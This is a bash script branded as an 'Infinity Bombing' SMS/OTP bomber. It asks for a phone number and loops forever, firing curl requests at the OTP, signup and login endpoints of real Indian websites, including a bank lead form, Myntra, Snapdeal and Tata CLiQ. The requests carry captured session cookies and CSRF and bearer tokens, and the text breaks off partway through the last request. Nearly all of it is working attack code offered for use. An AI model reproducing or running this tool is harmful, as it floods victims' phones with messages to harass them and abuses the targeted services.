#!/bin/bash
clear
bash .files/logo.sh
# # # # # # # # # # # # # # # # # #
#  ╭⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱╮  #
#  l| ⚝ ɪɴsᴛᴀɢʀᴀᴍ ꚸ ᴍ 𝟺 ᴜ . ʏ ᴛ  |l  #
#  l|      ✘ ηθικός : χάκερ ✘      |l  #
#  l|   ⛥ m4u-yt.blogspot.com ⛥   |l  #
#  ╰⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱╯  #
# # # # # # # # # # # # # # # # # #
#∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘#
logo="Created By ❤️ M4U.YT"
echo "$logo"
off="Press <CTRL+C> to [0FF]"
echo "$off"
echo "Enter Number Without Country C∅de"
read m4u
status="Infinity ∞ B∅mbing [0N] $m4u"
echo "$status"
while :
do
#∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘#
#<∅>24</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://apps.ucoonline.in/Lead_App/send_message.jsp' \
  -H 'authority: apps.ucoonline.in' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'origin: https://apps.ucoonline.in' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://apps.ucoonline.in/Lead_App/lead_web.jsp' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: JSESSIONID=9AF635F323A70A62FDE04FB64FD56F78.apps1' \
  --data-raw 'mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH+DELHI&lgBranch=0313&lgMobileno='$m4u'&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71' \
  --compressed
#<∅>23</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://user.india.com/user/verifyuserresend' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'Accept: */*' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://user.india.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://user.india.com/sso/signup?source=indiadotcom&utm_source=https://www.google.com/&utm_medium=Organic&ru=https://www.india.com?destination=/news/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: _gid=GA1.2.1294238960.1620210841; _ga=GA1.2.570440103.1620210840; _ga_L5EPNX0RMW=GS1.1.1620210839.1.1.1620210900.0; XSRF-TOKEN=eyJpdiI6IkcwZTNlVVVWXC9GMStNRm5xWUp4em5nPT0iLCJ2YWx1ZSI6ImZmVldxYlkrWDJLOHFBa2p1b1hMaDZnUkxYTmpWbGV6R1BQVENuVE5hV2JVY2UxU3J2bHJOM2htNmVuWEluNW4iLCJtYWMiOiIzNGQyOTU2ZDU5OWNkNGQ3YzE2ZjA5YTlmMjY4MTQxZDlhMTVlOTgzZWI0ZjNlNTdkYmQ5ZDViY2RiYmRjZWVmIn0%3D; laravel_session=eyJpdiI6IkcrUEIxbHZmXC9lb0NoR1NuXC84S2M1Zz09IiwidmFsdWUiOiJvdUltRkZtNzMwblJXd3QzaEFSNGx6WjlnQmVtK0Z4SVBIQ3FvRnh1MmNWemhVdVArcnMwaVRXekRUU0tTMGFhIiwibWFjIjoiNWY4MDVhMTAwZjMwODczYTdlN2RlMTc0NGQzZDVhOTFhMjc5NmQyYjQwN2ZmNjFlZGI1NDFhNGIwZjUzOWI1NyJ9' \
  --data-raw '{"_token":"c6hvjEXovxGCaCI12UhlqQY3PYDjfrAsEglVvf7w","email":"","password":"DDsd12Q@www","first_name":"wdrqwefwe","last_name":"deqwrfwe","mobile":"'$m4u'","source":"indiadotcom","ru":"https://www.india.com","count":3,"uuid":"In682Of","tc_check":"false","utm_source":"https://www.google.com/","utm_medium":"Organic"}' \
  --compressed
#<∅>22</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.tatacliq.com/mobileloginapi/v1/authnuser/validate' \
  -H 'authority: www.tatacliq.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'authorization: Bearer 4dce26e4-ab96-48e3-8963-019d5107d2f3' \
  -H 'registerviamobile: false' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'register-user: false' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'origin: https://www.tatacliq.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.tatacliq.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: bm_sz=76641CCA7D88FC504D4294F6722ECCFD~YAAQBtgsMXCdRh55AQAAKaPlOwvb+a8NtSg4YsE8NDiMuhia/6/G4ADWqUF57bUuO30yAoGm7l9ChjQqd+HFULJcHVCy6p26HtJibhRa23HmCTaL/RfzPJJ/FruoUOs3mDFvfKcrLhz5ZSGgoz5H6JOrxe/OHRtSClCWtUM16//IqcJ8ylaJU68hHsqKlIjs6oc=; at_check=true; sessionId=kob9rb4suq56i7r0; AMCVS_E9174ABF55BA76BA7F000101%40AdobeOrg=1; AMCV_E9174ABF55BA76BA7F000101%40AdobeOrg=-1124106680%7CMCIDTS%7C18753%7CMCMID%7C89947831559516870892903069579334425790%7CMCAAMLH-1620812376%7C12%7CMCAAMB-1620812376%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1620214777s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.2.0; _ga=GA1.2.855842057.1620207577; _gid=GA1.2.1538526407.1620207577; mbox=session#5db6c3ef9eea4cbf9896fc46201b0cdb#1620209437|PC#5db6c3ef9eea4cbf9896fc46201b0cdb.31_0#1683452378; globalAccessToken={"access_token":"4dce26e4-ab96-48e3-8963-019d5107d2f3","token_type":"bearer","expires_in":128425,"scope":"basic"}; isMNLAPI={"name":"is_MPL_WEB_MNL_Login_True_V1","value":true}; ak_bmsc=E6EE04CF0622B01C67EAE4C2BEE12BE4312CD806D8540000D7679260BC9EB937~pl0+QwU0jTgfs4L0+mJny2yH7EFbygvLc9qWFh59uQc/iGpS0Efia9BsFa2lRgKZYg+P7JpBUGGbdAi9Vh442vthM28h8iRPiPNItNjK+rdTFose1HEuavIzoIZy1VjmUFYODfhX1lqL8Dwr+a6x1fCwL8BDonH5q7Anse16H7OwuL76FhVINuy9R2SWnBnOVq+K8Wc+2WHamTD3YbadjKfbL5wVerbcgXRX/If6K3CZ44IwMMLbpNURiEHJoe7pZothHzOQkym5/MEY4qAyLlew==; s_cc=true; adb=0; WZRK_G=43f3bfd0d358402baf52bcbc0a968bbd; _abck=05F1086EDDC9C20D2149241B40BB704F~0~YAAQBtgsMXqdRh55AQAA56vlOwVQ6ui8qDSK8x0uYMgW0INCkYZKPBK+iAvqsl7GClXHiyJfzMLr9/MHz4QpkXY2aANZs0CitjQgV/pQeRPI9vGLw6OEY3mOdQk/N2JtKwyIQguMoeY8aBXGwfvj8+XpazV+8nDgiYBaub5sEGV6IOqdK+5LOVMwXQGsfI4gSrTFH2Az/EkSv44LMXa6dxc+pnhmz3T/Yh3U0FfuVJG/qZxvlMa4EVE6jRL25cEu+2qD4DTvjRh6g/Up89tNbA5cPiDklHSzyLL4U4n9hhH2KgMEvntfLoaEETSDy8rMZyqd1OfgAof/nRPhAC5yDbIaSxyGxpXPS1Yk94biUdBwd9c8Ib0dttXypdrPHir6TpS3co9XrAlBOaolfumhw4BYql6wFJbAug==~-1~||-1||~-1; _uetsid=cf39d130ad8511eb96edc31427714dd1; _uetvid=cf3a2e20ad8511ebbdfec74e32810900; _fbp=fb.1.1620207578898.1306767825; WZRK_S_867-R5K-8R5Z=%7B%22p%22%3A1%2C%22s%22%3A1620207578%2C%22t%22%3A1620207582%7D; gpv_pn=sm%3Apwa%3Amain%3Aall%3Ahomepageudit%3A1511199; s_ppvl=homepage%2C32%2C21%2C792%2C1478%2C792%2C1536%2C864%2C1.25%2CP; s_ppv=sm%253Apwa%253Amain%253Aall%253Ahomepageudit%253A1511199%2C32%2C32%2C792%2C775%2C792%2C1536%2C864%2C1.25%2CL; bm_sv=28504DDEF3706A5D082960965A96FB67~nFJLnQM5esrarg3/ERsi/j8wUwdBp5iQT7+cqO/5LKaw5usGgajOWuqNTAVS53PCzY8U6sjSwauKjz4b1Z3ssS4q3sw/EOSlwNwSx+Lr6sRq3Zx/v/wW9KdxUsO8hQ2vNPuGUVm92Bnkpl4bHanJwI0gP5pFcwJ3UcoZn4QMD2U=; s_nr=1620207680974-New; s_sq=tataul-prod%3D%2526c.%2526a.%2526activitymap.%2526page%253Dsm%25253Apwa%25253Amain%25253Aall%25253Ahomepageudit%25253A1511199%2526link%253DContinue%2526region%253Droot%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dsm%25253Apwa%25253Amain%25253Aall%25253Ahomepageudit%25253A1511199%2526pidt%253D1%2526oid%253Dfunctionla%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DBUTTON' \
  --data-raw '{"email":"","maskedPhoneNumber":"","otp":"","pass":"","phoneNumber":"'$m4u'","platformNumber":"11","currentOtp":"","newOtp":""}' \
  --compressed
#<∅>21</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/auth/login?user_id_change=9825612384&ajax=true&mobileOnly=false&doAction=' \
  -H 'authority: www.limeroad.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'accept: */*' \
  -H 'origin: https://www.limeroad.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.limeroad.com/auth/login' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: a_n_u_a=1; jr_token=true%3F%3F2232428f-14c7-4285-905e-dda79e8e2326%3F%3Fjoulroad%3F%3F009998ac-b7c5-4888-ad12-477d75903a49%3F%3FGuest; _ruid=633b03f8-669c-4398-9c6d-b0c07946e567; lrVr=v2; newCssOpt=v1; nH=1; _session_id=c2c709b75c302a077e8e8b5324af03ed; testCookie=v2; deviceWidth=1478; deviceHeight=792; _gcl_au=1.1.1482293243.1620206905; _gid=GA1.2.1515654165.1620206905; _uetsid=3dd72f50ad8411eb9970e9f20b931ca8; _uetvid=3dd7de50ad8411eb8c01e90a50454c8e; _fbp=fb.1.1620206905379.1232933328; _ga_GXXB4S5GJN=GS1.1.1620206905.1.0.1620206905.60; _ga=GA1.1.1848314037.1620206905; duid=24b11e0e8acdec2f55e3075d3801b514; mobile=9825612384; AWSALB=8Luq7Z1XritiFJ0V4T/P345rb8h8fQE7H58rtDLGGp62bwMedGhIt9hokDhAR2elkzvId++SdIdL58+5HpLhIIpFsjpECWzZvQsvMbcK+VQbbZZmetHa6sK2rsj7; AWSALBCORS=8Luq7Z1XritiFJ0V4T/P345rb8h8fQE7H58rtDLGGp62bwMedGhIt9hokDhAR2elkzvId++SdIdL58+5HpLhIIpFsjpECWzZvQsvMbcK+VQbbZZmetHa6sK2rsj7' \
  --data-raw 'utf8=%E2%9C%93&authenticity_token=2VXlD2cWJtUcKEmTxkdiQVwHSydt8cPebtelAXnSEi0%3D&user_id='$m4u'' \
  --compressed
#<∅>20</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.myntra.com/gateway/v1/auth/getotp' \
  -H 'authority: www.myntra.com' \
  -H 'deviceid: 9b85951c-a057-4f7f-98ca-b620d9d716da' \
  -H 'x-meta-app: deviceId=9b85951c-a057-4f7f-98ca-b620d9d716da;appFamily=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36;reqChannel=web;channel=web;' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'x-myntraweb: Yes' \
  -H 'x-location-context: pincode=363621;source=IP' \
  -H 'content-type: application/json' \
  -H 'x-sec-clge-req-type: ajax' \
  -H 'x-requested-with: browser' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: */*' \
  -H 'origin: https://www.myntra.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.myntra.com/login?referer=https://www.myntra.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: AKA_A2=A; bm_sz=6C8F492E114C96BD4ED72ACE75756BDE~YAAQr4osMVit5Q15AQAAn8vZOwsIXaVUjYSsuiATmZ56OM7Blzz+T8AfZ/2GLKxxHJ9hzsDDbaK02wBLZIpfOr5AkOG+e8F+KjopQGQ4rw+GCNGkGmaZpaWKyCkXBB1wA4On9K4A5E3tX/VAgzs3h5GIw7QkkqsUUH1droV2R0OTNZt83uk4l7vkl+CpIqVE; _d_id=9b85951c-a057-4f7f-98ca-b620d9d716da; mynt-eupv=1; _pv=default; dp=d; bc=true; microsessid=732; lt_timeout=1; lt_session=1; _xsrf=8XwmyDxwfFvMaKOSY3sXeEJst4Kxq2hQ; _ma_session=%7B%22id%22%3A%225b7eb0fd-da29-4dc3-8adc-4f725f17474a-9b85951c-a057-4f7f-98ca-b620d9d716da%22%2C%22referrer_url%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm_medium%22%3A%22organic%22%2C%22utm_source%22%3A%22www.google.com%22%2C%22utm_channel%22%3A%22organic%22%7D; ak_bmsc=ADE11D1CA3638282A82FEAC59D63DE59312C8AAFC0010000CF6492605F86F30E~plQppJcJ7C0nD2UktsVigqIyDa/ffUTio06RGQnle6B6o/FUOzHo4XhcFZ58/yR4ljO0Y9ad6sKFW2eYkbm69Jq6tYXIXNcKiaKI2qLwa+ohwhaf9Q7nBgy+JGtbe6ukoHhfyqf1jtqu6kU99Melej7SvcOlpY+5mVYns6z7XVUrwnazQT16Z2xFbj9Wn7ccDFMiABlPzOoT+1fEDT+CBe4LmlVhTFKBZsU2QNK06TpypEzCMHFDwXjv+vYm8waqJ+; _gcl_au=1.1.2002209996.1620206803; at=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJbXRwWkNJNklqRWlMQ0owZVhBaU9pSktWMVFpZlEuZXlKdWFXUjRJam9pTURFd05ETXdNVGd0WVdRNE5DMHhNV1ZpTFRnME56Z3RNREF3WkROaFpqSTROVFl4SWl3aVkybGtlQ0k2SW0xNWJuUnlZUzB3TW1RM1pHVmpOUzA0WVRBd0xUUmpOelF0T1dObU55MDVaRFl5WkdKbFlUVmxOakVpTENKaGNIQk9ZVzFsSWpvaWJYbHVkSEpoSWl3aWMzUnZjbVZKWkNJNklqSXlPVGNpTENKbGVIQWlPakUyTXpVM05UZzRNRElzSW1semN5STZJa2xFUlVFaWZRLkRGUDVra3o0dGJDWHJuaF9JZ1pLY05DdG12ampCNjBuUlI5cE9jWllIRFU=; _abck=4253988C295DCED78DC84737AB99A74E~0~YAAQr4osMYet5Q15AQAA8NfZOwWqmpHufJ6ePAgCYxt6g1h0rwx6vuyjl8IV7vmrS7MzRQ//GWoRvmLwZQj421gp3IFcF5vK6iZ+Az6w+Ac9LVZBPz9xBtbQoYrObkApGFTFncFMIyoa/eW42Ma6TJhatIlPXWlDDX2ndjutpIZgAf/jqsn10C3mveJIhvsrciyL9WVLd9mK3ItIqJRZKne2Figh/+YU+OKZmweF27NRm1YNvXM6gJwr9jjPqOdT/RRUmeWc39w4befiB/E+6TGeNTvhP0c2Wmgeh3uJ8XzvJTBaYDqqIn8HT0Bt+EUhBlxEO29q/aRHmX3C0ynhOZPUf8TMy0GxtRnEuQKzWgBa+63fgESbLh0cnKnMQlgIXYqxI4em6FSbZd6nXNIMkSASM+SXO3w=~-1~-1~-1; mynt-ulc-api=pincode%3A363621; mynt-loc-src=expiry%3A1620208243249%7Csource%3AIP; _fbp=fb.1.1620206803379.194735038; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.1278426921.1620206803; _gid=GA1.2.547458430.1620206803; _gat=1; _gat_UA-1752831-18=1; tvc_VID=1; _mxab_=checkout.addressOnCart%3Denabled%3Bconfig.bucket%3Dregular%3Bpdp.desktop.savedAddress%3Denabled%3Bcheckout.privacy.policy%3Ddisabled%3Bcheckout.attachedProducts%3Denabled%3Bcheckout.cartTrustNSafetyMarker%3Ddisabled; user_session=rX_0CYr0QbTyHsLtdwWusA.KHLEhFslkyMdApRJHaAIQc2ensxdEGLhKL38bWEYvWqCAIRnMSeUq0KF3eeMAnoI_GfKhjBH2-U3hEAU8zFbYALG06CMSyr7wFisvCKSFzGOBze_k1CpHLAajR8unvd1MlpdWxgmHJNvRR0YPhE1jQ.1620206801166.86400000.Fn6p_4vvM5ryEk-6X_y_bd7cyJwmiwWc8TBrsAWBcg4; ak_RT="z=1&dm=myntra.com&si=b332a121-1d90-4037-a481-a8bc45862f97&ss=kob9anfq&sl=0&tt=0&bcn=%2F%2F684fc53f.akstat.io%2F"; utm_track_v1=%7B%22utm_source%22%3A%22direct%22%2C%22utm_medium%22%3A%22direct%22%2C%22trackstart%22%3A1620206804%2C%22trackend%22%3A1620206864%7D; G_ENABLED_IDPS=google; utrid=Y2JnC15ycGlgdQxaRnxAMCM0MDQ5MTc1MDcxJDI%3D.4f115a1f7294876279f94b2327c06cbc; akaas_myntra_SegmentationLabel=1622798813~rv=94~id=6c1857ba9f8a8fb26a9c5f01fbeaf15a~rn=PWA; bm_sv=D408E4DD34BC4436367F7A1C4407E1CC~BajuYscK23wR4V3VihzSlhrhJWOQsQOCOFhRgrAj+vh2YiXDSaSVCz+5mjgR8XItiYfPVj2YyL1ENxL1aHh4iQDnbaAp78lxmc5TaDHlDm2ejqlMyU+C3WcIN3wFFmH+pMQhjBFYnpcqGnongMUKeuEKqLAVha3PE+jQn4SYyBY=' \
  --data-raw '{"phoneNumber":"'$m4u'"}' \
  --compressed
#<∅>19</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.snapdeal.com/sendOTP' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'Accept: */*' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: https://www.snapdeal.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://www.snapdeal.com/iframeLogin' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H $'Cookie: alps=akm; st=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; vt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; lt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; SCOUTER=z5nbl2bog32ob8; JSESSIONID=2F985564BE3D9A5204BC243F6DF369E3; versn=v1; u=162020605587572264; sd.zone=Z5; xg="eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQSxNVUwsMCIsInNwX3NsYWIiOiJDIiwidXJsIjoiWjEifSwic2MiOnsic2hpcHBpbmdfaW50ZXJ2YWwiOiJtbF8xZF93b2IiLCJkdXBpIjoiNyJ9LCJ1aWQiOnsiZ3VpZCI6IjE1NTA0NzE4LTBkNjctNDI1NC1hZDdhLTFmNmMyY2M5NTI1OSJ9fXx8MTYyMDIwNzg1NTg3OA=="; xc="eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQSxNVUwsMCIsInNwX3NsYWIiOiJDIiwidXJsIjoiWjEifSwic2MiOnsic2hpcHBpbmdfaW50ZXJ2YWwiOiJtbF8xZF93b2IiLCJkdXBpIjoiNyJ9fQ=="; isWebP=true; _uetsid=43dc6930ad8211eb9bc531fc2bc366a4; _uetvid=43dc9090ad8211ebbefe636db17a5ad8; f5_cspm=1234; _fbp=fb.1.1620206058794.2097708842; _sdDPPageId=1620206256826_4954_162020605587572264; s_pers=%20s_vnum%3D1622798057677%2526vn%253D1%7C1622798057677%3B%20gpv_pn%3DiframeLogin%7C1620208058524%3B%20s_invisit%3Dtrue%7C1620208058528%3B; s_sess=%20s_sq%3D%3B%20s_cc%3Dtrue%3B%20s_ppv%3D100%3B; Megatron=\u0021tQKLbx8uarpWFH3+ZidaGBcQKxXOrCIqLbEsRUm+WTt5tmu4Td4oxJcNrPaCIxgBi90D/HHaMO0RBow=' \
  --data-raw 'emailId=&mobileNumber='$m4u'&purpose=LOGIN_WITH_MOBILE_OTP' \
  --compressed
#<∅>18</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.snapdeal.com/signupAjax' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Origin: https://www.snapdeal.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://www.snapdeal.com/iframeLogin' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H $'Cookie: alps=akm; st=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; vt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; lt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; SCOUTER=z5nbl2bog32ob8; JSESSIONID=2F985564BE3D9A5204BC243F6DF369E3; versn=v1; u=162020605587572264; sd.zone=Z5; xg="eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQSxNVUwsMCIsInNwX3NsYWIiOiJDIiwidXJsIjoiWjEifSwic2MiOnsic2hpcHBpbmdfaW50ZXJ2YWwiOiJtbF8xZF93b2IiLCJkdXBpIjoiNyJ9LCJ1aWQiOnsiZ3VpZCI6IjE1NTA0NzE4LTBkNjctNDI1NC1hZDdhLTFmNmMyY2M5NTI1OSJ9fXx8MTYyMDIwNzg1NTg3OA=="; xc="eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQSxNVUwsMCIsInNwX3NsYWIiOiJDIiwidXJsIjoiWjEifSwic2MiOnsic2hpcHBpbmdfaW50ZXJ2YWwiOiJtbF8xZF93b2IiLCJkdXBpIjoiNyJ9fQ=="; isWebP=true; _uetsid=43dc6930ad8211eb9bc531fc2bc366a4; _uetvid=43dc9090ad8211ebbefe636db17a5ad8; f5_cspm=1234; _fbp=fb.1.1620206058794.2097708842; _sdDPPageId=1620206072103_8262_162020605587572264; s_sess=%20s_sq%3D%3B%20s_cc%3Dtrue%3B%20s_ppv%3D0%3B; s_pers=%20s_vnum%3D1622798057677%2526vn%253D1%7C1622798057677%3B%20gpv_pn%3DiframeLogin%7C1620207902380%3B%20s_invisit%3Dtrue%7C1620207902385%3B; Megatron=\u0021cVsMo3wx1uCcscP+ZidaGBcQKxXOrI0+38Gg6PvSI3X/GFM56TRDOt8DbfYT+c4I5KmLoXIz5hARvCc=' \
  --data-raw '{"j_number":"'$m4u'","j_username":"wqwqw@gmail.com","j_name":"fgdfgd","j_dob":"05/05/1996","j_password":"gfdgdgfg","j_confpassword":"gfdgdgfg","CSRFToken":"c891a0feaae8ccb083082fd2c5d21b41bb5a2cae","targetUrl":"","mobileStart":"true","numberEdit":"false","socialid":"","gender":"","j_displayname":"","language":"","source":"","lastname":"","firstname":""}' \
  --compressed
#<∅>17</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.shoppersstop.com/login/register' \
  -H 'authority: www.shoppersstop.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'device-memory: 4' \
  -H 'rtt: 150' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'viewport-width: 775' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'adrum: isAjax:true' \
  -H 'downlink: 7.6' \
  -H 'dpr: 1.25' \
  -H 'ect: 4g' \
  -H 'origin: https://www.shoppersstop.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.shoppersstop.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: _dy_csc_ses=t; _dy_c_exps=; AMCVS_E71BF792598CD6610A495DB7%40AdobeOrg=1; G_ENABLED_IDPS=google; stimgs={%22sessionId%22:39142441%2C%22didReportCameraImpression%22:false}; syte_uuid=e75b9f60-ad81-11eb-9f79-afb9b9812aec; _dycnst=dg; _dyid=-9209860871280238260; _dyjsession=f40596505a9857d1b33c17234226f93d; dy_fs_page=www.shoppersstop.com; _dycst=dk.l.c.ws.; _dy_toffset=-1; AMCV_E71BF792598CD6610A495DB7%40AdobeOrg=-637568504%7CMCIDTS%7C18753%7CMCMID%7C89404136791875728342920759345875972461%7CMCAAMLH-1620810700%7C12%7CMCAAMB-1620810700%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1620213101s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-18760%7CvVersion%7C5.1.1; _ga=GA1.2.494242229.1620205902; _gid=GA1.2.1972071994.1620205902; 